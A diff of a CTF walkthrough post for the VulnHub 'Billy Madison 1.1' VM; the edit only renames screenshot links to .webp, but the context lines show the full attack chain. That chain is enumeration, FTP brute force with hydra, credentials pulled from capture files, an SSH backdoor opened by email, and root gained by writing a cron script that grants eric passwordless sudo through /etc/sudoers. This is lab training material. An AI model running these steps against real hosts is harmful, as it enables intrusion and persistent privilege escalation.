@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Billy Madison: 1.1](https://www.vulnhub.com/entry/billy-madison-11,161). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_billymadison1dot1/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_billymadison1dot1/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -80,23 +80,23 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 2\. Tried connecting to Telnet service and found a ROT13 encoded string:  
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot01.png.webp)  
 
 3\. Decoded the ROT13 (Caesar Cipher) encoded string and used it as the HTTP directory name:  
 ```
 http://192.168.92.167/exschmenuating
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot02.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot02.png.webp)  
 
 4\. Found reference to the presence of files with names from `rockyou.txt` wordlist and `veronica` string in them. We created a custom wordlist, ran a `gobuster` scan and found a network capture file:  
 ```
 gobuster -u http://192.168.92.167/exschmenuating -w veronica.wordlist -e -k -l -s "200,204,301,302,307,403,500" -x "cap,pcap,capture" -o "results/192.168.92.167/scans/tcp_80_http_gobuster_dirbuster.txt" → http://192.168.92.167/exschmenuating/012987veronica.cap
 ```
 
-![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot03.png)  
+![writeup.enumeration.steps.4.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot03.png.webp)  
 
-![writeup.enumeration.steps.4.2](/static/files/posts_vulnhub_billymadison1dot1/screenshot04.png)  
+![writeup.enumeration.steps.4.2](/static/files/posts_vulnhub_billymadison1dot1/screenshot04.png.webp)  
 
 5\. Ran a port knock using the [Spanish Armada](https://www.youtube.com/watch?v=z5YU7JwVy7s) combo to open the FTP backdoor:  
 ```
@@ -109,39 +109,39 @@ nmap -p21 192.168.92.167
 hydra -l veronica -P veronica.wordlist 192.168.92.167 ftp → veronica/babygirl_veronica07@yahoo.com
 ```
 
-![writeup.enumeration.steps.6.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot05.png)  
+![writeup.enumeration.steps.6.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot05.png.webp)  
 
 7\. Found FTP password for user `eric` from the network capture file `012987veronica.cap`:  
 ```
 eric/ericdoesntdrinkhisownpee
 ```
 
-![writeup.enumeration.steps.7.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot06a.png)  
+![writeup.enumeration.steps.7.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot06a.png.webp)  
 
 8\. Connected as user `eric` to the FTP service and found a `.notes` file:  
 ```
 ftp://eric@192.168.92.167/.notes
 ```
 
-![writeup.enumeration.steps.8.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot06.png)  
+![writeup.enumeration.steps.8.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot06.png.webp)  
 
 9\. Found reference to a SSH backdoor that requires sending an email with text `My kid will be a **soccer player**`:  
 ```
 swaks --to eric@madisonhotels.com --from vvaughn@polyfector.edu --server 192.168.92.167:2525 --body "My kid will be a soccer player" --header "Subject: My kid will be a soccer player"
 ```
 
-![writeup.enumeration.steps.9.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot10.png)  
+![writeup.enumeration.steps.9.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot10.png.webp)  
 
 10\. Port `1974/tcp` is the SSH backdoor placed on the target host by user `eric`:  
 
-![writeup.enumeration.steps.10.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot11.png)  
+![writeup.enumeration.steps.10.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot11.png.webp)  
 
 11\. Found a network capture file `eg-01.cap` from user `veronica`'s FTP directory:  
 ```
 ftp://veronica@192.168.92.167/eg-01.cap
 ```
 
-![writeup.enumeration.steps.11.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot09.png)  
+![writeup.enumeration.steps.11.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot09.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -170,14 +170,14 @@ ssh: eric, veronica
 aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt → triscuit*
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot12.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot12.png.webp)  
 
 2\. We login as user `eric` to the SSH backdoor and gain initial shell access:  
 ```
 ssh -p1974 eric@192.168.92.167
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/writeup.exploitation.screenshot.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/writeup.exploitation.screenshot.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -210,7 +210,7 @@ find / -type f -perm -04000 2>/dev/null → /usr/local/share/sgml/donpcgd
 
 2\. We test this binary and find that it requires two file path parameters. It creates an empty file at path passed as argument #2 with permissions of file passed as argument #1:  
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot13.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot13.png.webp)  
 
 3\. Used this to create a empty file at file path `/etc/cron.hourly/testing` with `chmod 777` permissions. We then added commands to this new file to add user `eric` to `/etc/sudoers`:  
 ```
@@ -219,7 +219,7 @@ chmod 777 testing
 echo -e '#!/bin/bash\necho "eric ALL=(ALL) NOPASSWD:ALL" >>/etc/sudoers' >/etc/cron.hourly/testing
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot14.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot14.png.webp)  
 
 4\. We had to wait for an hour for the `cron` job to execute and after that running the `sudo -l` command confirmed that `sudoers` permissions are now enabled for user `eric`. We then changed to user `root`:  
 ```
@@ -227,7 +227,7 @@ sudo -l
 sudo su
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_billymadison1dot1/writeup.privesc.screenshot.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_billymadison1dot1/writeup.privesc.screenshot.png.webp)  
 
 5\. We copied `BowelMovement` and `hints.txt` files from `/PRIVATE/` directory to `/home/eric/` and changed file owner to user `eric`. Then we download both files locally using `scp`:  
 ```
@@ -235,21 +235,21 @@ scp -p1974 eric@192.168.92.167:/home/eric/BowelMovement ./
 scp -p1974 eric@192.168.92.167:/home/eric/hints.txt ./
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot15.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot15.png.webp)  
 
 6\. The `hints.txt` file hinted at a possible password from the Wikipedia page [BillyMadison](https://en.wikipedia.org/wiki/Billy_Madison). We used `cewl` to create a wordlist from the wiki page:  
 ```
 cewl -d0 "https://en.wikipedia.org/wiki/Billy_Madison" >wiki.wordlist
 ```
 
-![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot16.png)  
+![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot16.png.webp)  
 
 7\. We then ran a password bruteforce on `BowelMovement` file as a `truecrypt` encrypted blob using `truecrack` and found it key:  
 ```
 truecrack -t BowelMovement -w wiki.wordlist → execrable
 ```
 
-![writeup.privesc.steps.7.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot17.png)  
+![writeup.privesc.steps.7.1](/static/files/posts_vulnhub_billymadison1dot1/screenshot17.png.webp)  
 
 8\. Mounting the decrypted `BowelMovement` file reveals a partition with `secret.zip` that contains both `Billy_Madison_12th_Grade_Final_Project.doc` and `THE-END.txt` files.  
 
